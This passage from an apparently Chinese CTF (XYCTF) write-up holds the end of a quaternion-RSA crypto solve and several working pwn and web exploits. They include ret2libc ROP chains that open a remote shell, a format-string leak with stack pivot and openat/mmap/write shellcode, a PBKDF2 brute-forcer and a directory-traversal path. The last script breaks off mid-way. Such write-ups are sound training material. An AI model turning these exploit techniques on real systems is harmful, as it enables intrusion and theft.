        <span class="token keyword">return</span> ComComplex<span class="token punctuation">(</span><span class="token punctuation">[</span>l<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span>inv_len<span class="token operator">%</span>mod<span class="token punctuation">,</span><span class="token operator">-</span>l<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span>inv_len<span class="token operator">%</span>mod<span class="token punctuation">,</span><span class="token operator">-</span>l<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">*</span>inv_len<span class="token operator">%</span>mod<span class="token punctuation">,</span><span class="token operator">-</span>l<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">*</span>inv_len<span class="token operator">%</span>mod<span class="token punctuation">]</span><span class="token punctuation">)</span>


<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>

hints <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">375413371936</span><span class="token punctuation">,</span><span class="token number">452903063925</span><span class="token punctuation">,</span><span class="token number">418564633198</span><span class="token punctuation">,</span><span class="token number">452841062207</span><span class="token punctuation">]</span>
gift <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">8123312244520119413231609191866976836916616973013918670932199631084038015924368317077919454611785179950870055560079987034735836668109705445946887481003729</span><span class="token punctuation">,</span><span class="token number">20508867471664499348708768798854433383217801696267611753941328714877299161068885700412171</span><span class="token punctuation">,</span><span class="token number">22802458968832151777449744120185122420871929971817937643641589637402679927558503881707868</span><span class="token punctuation">,</span><span class="token number">40224499597522456323122179021760594618350780974297095023316834212332206526399536884102863</span><span class="token punctuation">]</span>
P <span class="token operator">=</span> <span class="token number">8123312244520119413231609191866976836916616973013918670932199631182724263362174895104545305364960781233690810077210539091362134310623408173268475389315109</span>
n <span class="token operator">=</span> <span class="token number">408713495380933615345467409596399184629824932933932227692519320046890365817329617301604051766392980053993030281090124694858194866782889226223493799859404283664530068697313752856923001112586828837146686963124061670340088332769524367</span>
c <span class="token operator">=</span> ComComplex<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">212391106108596254648968182832931369624606731443797421732310126161911908195602305474921714075911012622738456373731638115041135121458776339519085497285769160263024788009541257401354037620169924991531279387552806754098200127027800103</span><span class="token punctuation">,</span><span class="token number">24398526281840329222660628769015610312084745844610670698920371305353888694519135578269023873988641161449924124665731242993290561874625654977013162008430854786349580090169988458393820787665342793716311005178101342140536536153873825</span><span class="token punctuation">,</span><span class="token number">45426319565874516841189981758358042952736832934179778483602503215353130229731883231784466068253520728052302138781204883495827539943655851877172681021818282251414044916889460602783324944030929987991059211909160860125047647337380125</span><span class="token punctuation">,</span><span class="token number">96704582331728201332157222706704482771142627223521415975953255983058954606417974983056516338287792260492498273014507582247155218239742778886055575426154960475637748339582574453542182586573424942835640846567809581805953259331957385</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
e<span class="token operator">=</span><span class="token number">65547</span>

inv<span class="token operator">=</span>ComComplex<span class="token punctuation">.</span>inv<span class="token punctuation">(</span>hints<span class="token punctuation">,</span>P<span class="token punctuation">)</span>
gifts<span class="token operator">=</span>ComComplex<span class="token punctuation">(</span>gift<span class="token punctuation">)</span>
keys<span class="token operator">=</span>inv<span class="token operator">*</span>gifts<span class="token operator">%</span>P
<span class="token keyword">print</span><span class="token punctuation">(</span>keys<span class="token punctuation">)</span>

_<span class="token punctuation">,</span>p<span class="token punctuation">,</span>q<span class="token punctuation">,</span>r<span class="token operator">=</span>keys<span class="token punctuation">.</span>value
<span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token operator">*</span>q<span class="token operator">*</span>r<span class="token operator">-</span>n<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>GCD<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>r<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>GCD<span class="token punctuation">(</span>e<span class="token punctuation">,</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>GCD<span class="token punctuation">(</span>e<span class="token punctuation">,</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>GCD<span class="token punctuation">(</span>e<span class="token punctuation">,</span>r<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


d<span class="token operator">=</span>inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>q<span class="token operator">**</span><span class="token number">4</span><span class="token operator">-</span>q<span class="token operator">**</span><span class="token number">3</span><span class="token operator">-</span>q<span class="token operator">**</span><span class="token number">2</span><span class="token operator">+</span>q<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">3</span><span class="token punctuation">)</span>
m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>q<span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> m<span class="token punctuation">.</span>value<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>


</code></pre>

<p>flag{Quaternion_15_ComComComComplexXXX!!!?}</p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Ret2libc’s-Revenge"><a href="#Ret2libc’s-Revenge" class="headerlink" title="Ret2libc’s Revenge"></a>Ret2libc’s Revenge</h3><p>溢出可以写负数来改返回地址，之后ret2libc就行</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"DEBUG"</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span> <span class="token string">"splitw"</span><span class="token punctuation">,</span> <span class="token string">"-h"</span><span class="token punctuation">]</span>
<span class="token comment">#io=process("./chal")</span>
io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"47.93.96.189"</span><span class="token punctuation">,</span> <span class="token number">36879</span><span class="token punctuation">)</span>

r <span class="token operator">=</span> <span class="token keyword">lambda</span> a <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>    a<span class="token operator">=</span><span class="token boolean">False</span>        <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token boolean">True</span>    <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b        <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>
shell <span class="token operator">=</span> <span class="token keyword">lambda</span>            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>script<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> gdbscript<span class="token operator">=</span>script<span class="token punctuation">)</span>

<span class="token comment">#debug("break *0x40127A")</span>
<span class="token comment">#debug()</span>

<span class="token comment">#target=0x404000-0x20</span>
target<span class="token operator">=</span><span class="token number">0x4005b0</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">-</span><span class="token number">0x20</span>
rbp<span class="token operator">=</span><span class="token number">0x040117d</span>
rsi_0<span class="token operator">=</span><span class="token number">0x00000000004010e4</span>
add_rsi<span class="token operator">=</span><span class="token number">0x04010eb</span>
puts<span class="token operator">=</span><span class="token number">0x404018</span>
rdi_rsi<span class="token operator">=</span><span class="token number">0x0401180</span>
plt<span class="token operator">=</span><span class="token number">0x0401070</span>
main<span class="token operator">=</span><span class="token number">0x40127B</span>
ret<span class="token operator">=</span><span class="token number">0x00000000004012a9</span>

num<span class="token operator">=</span><span class="token number">0xffffffff</span><span class="token operator">-</span><span class="token number">0x12</span><span class="token operator">-</span><span class="token number">0xc8</span>
p<span class="token operator">=</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">528</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rbp<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rsi_0<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>add_rsi<span class="token punctuation">)</span>
p<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rdi_rsi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">160</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	sl<span class="token punctuation">(</span>p<span class="token punctuation">)</span>

libc<span class="token operator">=</span>u64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">"\x7f"</span><span class="token punctuation">,</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"\0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x21b780</span>
<span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">)</span>


rsi<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x2be51</span>
rsi_rdx<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x118f2f</span>
rdi<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x2a3e5</span>

binsh<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x1d8678</span>
system<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0xeb080</span>
<span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>system<span class="token punctuation">)</span>

p<span class="token operator">=</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">528</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rbp<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x4040a0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rsi_rdx<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
shell<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>



<h3 id="web苦手"><a href="#web苦手" class="headerlink" title="web苦手"></a>web苦手</h3><p>两个密码生成的密钥只要最高位为00就可以绕过检测</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> itertools
<span class="token keyword">import</span> string

salt <span class="token operator">=</span> <span class="token string">b"XYCTF"</span>
iterations <span class="token operator">=</span> <span class="token number">1</span>
dklen <span class="token operator">=</span> <span class="token number">32</span>

charset <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits  <span class="token comment"># a-zA-Z0-9</span>

<span class="token keyword">for</span> length <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> candidate <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span>charset<span class="token punctuation">,</span> repeat<span class="token operator">=</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
        password <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>candidate<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
        key <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>pbkdf2_hmac<span class="token punctuation">(</span><span class="token string">"sha1"</span><span class="token punctuation">,</span> password<span class="token punctuation">,</span> salt<span class="token punctuation">,</span> iterations<span class="token punctuation">,</span> dklen<span class="token punctuation">)</span>
        <span class="token keyword">if</span> key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Found password:"</span><span class="token punctuation">,</span> password<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>errors<span class="token operator">=</span><span class="token string">"ignore"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment">#J</span>
<span class="token comment">#aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaae2</span>
</code></pre>

<p>用这两个密码登陆之后目录穿越拿到真的flag</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">//</span>flag</code></pre>

<h3 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a>girlfriend</h3><p>栈迁移打mprotect，之后用openat, mmap, write 读flag</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"DEBUG"</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span> <span class="token string">"splitw"</span><span class="token punctuation">,</span> <span class="token string">"-h"</span><span class="token punctuation">]</span>
<span class="token comment">#io=process("./chal")</span>
io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"47.94.15.198"</span><span class="token punctuation">,</span> <span class="token number">34840</span><span class="token punctuation">)</span>

r <span class="token operator">=</span> <span class="token keyword">lambda</span> a <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>    a<span class="token operator">=</span><span class="token boolean">False</span>        <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token boolean">True</span>    <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b        <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>
shell <span class="token operator">=</span> <span class="token keyword">lambda</span>            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>script<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> gdbscript<span class="token operator">=</span>script<span class="token punctuation">)</span>


sa<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>
p<span class="token operator">=</span><span class="token string">"%7$p-%15$p-%3$p"</span>
sa<span class="token punctuation">(</span><span class="token string">"first"</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">"name:\n"</span><span class="token punctuation">)</span>
leak<span class="token operator">=</span>ru<span class="token punctuation">(</span><span class="token string">"Y"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span>
canary<span class="token operator">=</span><span class="token builtin">eval</span><span class="token punctuation">(</span>leak<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
pie<span class="token operator">=</span><span class="token builtin">eval</span><span class="token punctuation">(</span>leak<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x18d9</span>
libc<span class="token operator">=</span><span class="token builtin">eval</span><span class="token punctuation">(</span>leak<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x114887</span>
<span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>pie<span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">)</span>

read<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x1147d0</span>
ret<span class="token operator">=</span>pie<span class="token operator">+</span><span class="token number">0x0157B</span>
rdi<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x2a3e5</span>
rax<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x45eb0</span>
rsi<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x02be51</span>
r12<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x35731</span>
rdx_r12_r13<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0xa80c8</span>
mprotect<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x11eaa0</span>
call<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x29d8e</span>

sa<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>

rop<span class="token operator">=</span><span class="token string">"X"</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
rop<span class="token operator">=</span>rop<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">"X"</span><span class="token punctuation">)</span>

sc<span class="token operator">=</span>asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""
movabs rax, 0x67616C66
push 0
push rax
push rsp
mov rdi, -100
pop rsi
xor rdx, rdx
xor r10, r10
mov rax, 0x101
syscall #openat(AT_FDCWD, "flag.txt", 0, 0);

mov rdi, 0x1337000
mov rsi, 0x1000
mov rdx, 1
mov r10, 1
mov r8, rax
xor r9, r9
mov rax, 0x9
syscall #mmap(0x1337000, 0x100, PROT_READ | PROT_WRITE, rax, 1);

mov rdi, 1
mov rsi, 0x1337000
mov rdx, 0x100
mov rax, 1
syscall
"""</span><span class="token punctuation">)</span>

rop<span class="token operator">=</span><span class="token string">""</span>
rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pie<span class="token operator">+</span><span class="token number">0x4000</span><span class="token punctuation">)</span>
rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span>
rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rdx_r12_r13<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rdx_r12_r13<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>mprotect<span class="token punctuation">)</span>
<span class="token comment">#rop+=p64(rdi)+p64(0)</span>
<span class="token comment">#rop+=p64(rsi)+p64(pie+0x4000+0x1000)</span>
<span class="token comment">#rop+=p64(r12)+p64(0x100)</span>
<span class="token comment">#rop+=p64(rdx_r12_r13)+p64(0)*2</span>
<span class="token comment">#rop+=p64(read)</span>
rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rax<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pie<span class="token operator">+</span><span class="token number">0x40d0</span><span class="token punctuation">)</span>
rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>call<span class="token punctuation">)</span>
rop<span class="token operator">+=</span>sc

<span class="token keyword">print</span> <span class="token builtin">len</span><span class="token punctuation">(</span>rop<span class="token punctuation">)</span>
sa<span class="token punctuation">(</span><span class="token string">"first"</span><span class="token punctuation">,</span> rop<span class="token punctuation">)</span>

sla<span class="token punctuation">(</span><span class="token string">"Choice:"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span>
p<span class="token operator">=</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">56</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pie<span class="token operator">+</span><span class="token number">0x04060</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pie<span class="token operator">+</span><span class="token number">0x1676</span><span class="token punctuation">)</span>
<span class="token comment">#p="A"*56+p64(canary)+"A"*8+p64(pie+0x1220)</span>
<span class="token comment">#debug()</span>
sa<span class="token punctuation">(</span><span class="token string">"?"</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>


sc<span class="token operator">=</span>asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""
movabs rax, 0x67616C66
push 0
push rax
push rsp
mov rdi, -100
pop rsi
xor rdx, rdx
xor r10, r10
mov rax, 0x101
syscall #openat(AT_FDCWD, "flag", 0, 0);

mov rdi, 0x1337000
mov rsi, 0x1000
mov rdx, 1
mov r10, 1
mov r8, rax
xor r9, r9
mov rax, 0x9
syscall #mmap(0x1337000, 0x100, PROT_READ | PROT_WRITE, rax, 1);

mov rdi, 1
mov rsi, 0x1337000
mov rdx, 0x100
mov rax, 1
syscall
"""</span><span class="token punctuation">)</span>


<span class="token comment">#debug()</span>
shell<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>



<h3 id="明日方舟寻访模拟器"><a href="#明日方舟寻访模拟器" class="headerlink" title="明日方舟寻访模拟器"></a>明日方舟寻访模拟器</h3><p>让count变成sh之后传给system，因为输出被关所以把输出道到stderr</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"INFO"</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span> <span class="token string">"splitw"</span><span class="token punctuation">,</span> <span class="token string">"-h"</span><span class="token punctuation">]</span>
<span class="token comment">#io=process("./chal")</span>
io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"47.94.172.18"</span><span class="token punctuation">,</span> <span class="token number">28754</span><span class="token punctuation">)</span>

r <span class="token operator">=</span> <span class="token keyword">lambda</span> a <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>    a<span class="token operator">=</span><span class="token boolean">False</span>        <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token boolean">True</span>    <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b        <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>
